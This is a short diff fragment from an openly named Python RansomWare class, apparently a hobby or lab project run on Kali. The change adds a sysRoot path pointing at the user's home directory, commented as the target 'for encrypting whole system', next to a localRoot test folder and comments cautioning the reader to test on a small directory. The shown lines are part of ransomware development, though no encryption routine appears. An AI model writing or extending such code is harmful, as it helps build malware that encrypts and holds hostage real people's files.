@@ -46,7 +46,9 @@ class RansomWare:
             CAUTION: Play it safe, create a mini root directory to see how this software works it is no different
             CAUTION: eg, use 'localRoot' and create Some folder directory and files in them folders etc.
         '''
-
+        # Use sysroot to create absolute path for files, etc. And for encrypting whole system
+        self.sysRoot = os.path.expanduser('~')
+        
         # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
         self.localRoot = r'/home/kali/Desktop/SuperImportantFolder/' # Debugging/Testing
 
